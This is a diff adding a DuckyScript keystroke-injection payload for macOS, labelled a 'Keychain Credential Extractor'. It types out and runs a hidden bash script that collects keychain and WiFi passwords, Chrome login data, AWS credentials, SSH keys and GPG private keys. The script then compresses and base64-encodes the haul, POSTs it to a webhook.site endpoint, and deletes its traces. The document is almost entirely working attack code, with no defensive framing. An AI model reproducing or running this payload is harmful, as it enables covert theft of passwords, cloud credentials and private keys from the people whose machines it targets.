@@ -1,0 +1,77 @@
+REM NullSec - macOS Keychain Credential Extractor
+REM Extracts passwords from macOS Keychain
+REM Requires user interaction for authorization prompts
+
+DELAY 500
+GUI SPACE
+DELAY 500
+STRING terminal
+DELAY 500
+ENTER
+DELAY 1000
+
+REM Create extraction script that uses security command
+STRING cat > /tmp/.keychain.sh << 'SCRIPT'
+#!/bin/bash
+OUT="/tmp/.keychain_$(date +%s)"
+mkdir -p "$OUT"
+
+# List all keychains
+security list-keychains > "$OUT/keychains.txt" 2>&1
+
+# Get WiFi passwords (requires auth)
+echo "=== WiFi Passwords ===" > "$OUT/wifi_passwords.txt"
+/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s 2>/dev/null | awk '{print $1}' | while read ssid; do
+    if [ -n "$ssid" ]; then
+        pwd=$(security find-generic-password -D "AirPort network password" -a "$ssid" -w 2>/dev/null)
+        [ -n "$pwd" ] && echo "$ssid: $pwd" >> "$OUT/wifi_passwords.txt"
+    fi
+done
+
+# Chrome saved passwords (encrypted, need key)
+cp ~/Library/Application\ Support/Google/Chrome/Default/Login\ Data "$OUT/chrome_logins.db" 2>/dev/null
+
+# Safari passwords pointer
+echo "Safari passwords in: ~/Library/Keychains/login.keychain-db" > "$OUT/safari_note.txt"
+
+# Extract generic passwords (may prompt)
+echo "=== Generic Passwords ===" > "$OUT/generic_passwords.txt"
+security dump-keychain -d ~/Library/Keychains/login.keychain-db 2>/dev/null | grep -A5 "keychain" >> "$OUT/generic_passwords.txt"
+
+# Internet passwords
+echo "=== Internet Passwords ===" > "$OUT/internet_passwords.txt"
+security find-internet-password -g 2>&1 | head -50 >> "$OUT/internet_passwords.txt"
+
+# AWS credentials
+cp ~/.aws/credentials "$OUT/aws_creds.txt" 2>/dev/null
+cp ~/.aws/config "$OUT/aws_config.txt" 2>/dev/null
+
+# SSH keys
+cp -r ~/.ssh "$OUT/ssh_keys" 2>/dev/null
+
+# GPG keys
+gpg --export-secret-keys --armor > "$OUT/gpg_private.asc" 2>/dev/null
+
+# System info
+system_profiler SPHardwareDataType SPSoftwareDataType > "$OUT/system_info.txt" 2>/dev/null
+
+# Compress and exfil
+cd /tmp
+tar -czf ".keychain.tar.gz" "$(basename $OUT)"
+base64 -i ".keychain.tar.gz" -o ".keychain.b64"
+
+# Exfil
+curl -s -X POST --data-binary @".keychain.b64" "https://webhook.site/YOUR-ID"
+
+# Cleanup
+rm -rf "$OUT" /tmp/.keychain.* /tmp/.n01d_mac.sh
+SCRIPT
+ENTER
+DELAY 200
+
+STRING chmod +x /tmp/.keychain.sh && /tmp/.keychain.sh &
+ENTER
+DELAY 100
+
+STRING exit
+ENTER
